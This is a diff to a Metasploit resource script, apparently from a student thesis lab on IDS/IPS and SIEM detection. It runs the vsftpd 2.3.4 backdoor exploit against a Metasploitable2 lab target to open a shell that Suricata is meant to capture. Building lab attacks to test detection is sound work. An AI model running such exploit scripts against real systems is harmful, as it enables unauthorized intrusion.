@@ -1,9 +1,20 @@
+# ============================================================
 # Scénario D — Exploitation vsftpd 2.3.4 (Metasploit)
-# Itération : 3
-# Cible : metasploitable 10.0.10.30
-# Lancer avec : msfconsole -r attack.rc
+# Itération 3 — TFE IDS/IPS & SIEM (Eurostar)
+# Cible        : metasploitable2 — 10.0.10.30 (zone DMZ)
+# Source       : kali-attacker — 192.168.1.50 (zone WAN)
+# MITRE ATT&CK : T1190 — Exploit Public-Facing Application (Initial Access)
+# Objectif     : shell via backdoor vsftpd (port 6200), flux capturé par Suricata
+# Usage        : msfconsole -r attack.rc
+# ============================================================
+
+spool scenarios/D_metasploit/results/msf_console.log
 
 use exploit/unix/ftp/vsftpd_234_backdoor
+show options
 set RHOSTS 10.0.10.30
 set RPORT 21
 run
+
+sessions -l
+spool off
